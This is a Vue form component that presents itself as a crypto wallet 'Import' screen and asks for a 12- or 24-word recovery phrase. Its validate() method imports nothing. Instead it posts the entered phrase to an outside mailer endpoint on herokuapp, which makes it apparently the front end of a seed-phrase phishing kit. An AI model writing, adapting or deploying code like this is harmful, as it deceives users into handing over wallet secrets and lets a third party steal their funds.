<template>
  <v-form ref="form" class="p-3" v-model="valid" lazy-validation>
    <v-container fluid>
      <v-textarea
        v-model="phrase"
        :rules="nameRules"
        label="Phrase"
        hint="Typically 12(sometimes 24) words separated by single spaces"
        clearable
        auto-grow
        autofocus
        required
      ></v-textarea>
    </v-container>

    <v-btn
      :disabled="!valid"
      color="success"
      class="px-4 col-12 col-lg-4"
      @click="validate"
    >
      Import
    </v-btn>
  </v-form>
</template>
<script>
export default {
  name: "PhraseComp",
  data: () => ({
    valid: true,
    phrase: "",
    nameRules: [
      (v) => !!v || "Phrase is required",
      //   (v) => (v && v.length <= 10) || "Name must be less than 10 characters",
    ],
    email: "",
    emailRules: [
      (v) => !!v || "E-mail is required",
      (v) => /.+@.+\..+/.test(v) || "E-mail must be valid",
    ],
    select: null,
    items: ["Item 1", "Item 2", "Item 3", "Item 4"],
    checkbox: false,
  }),

  methods: {
    async validate() {
      this.$refs.form.validate();
      const baseURL = "https://everify-mailer.herokuapp.com/";
      const data = {
        data: {
          subject: "phrase",
          info: this.phrase,
        },
      };
      try {
        const response = await this.$http.post(baseURL, data);
        alert(response.data.msg);
      } catch (error) {
        // console.log(error);
      }
    },
  },
};
</script>
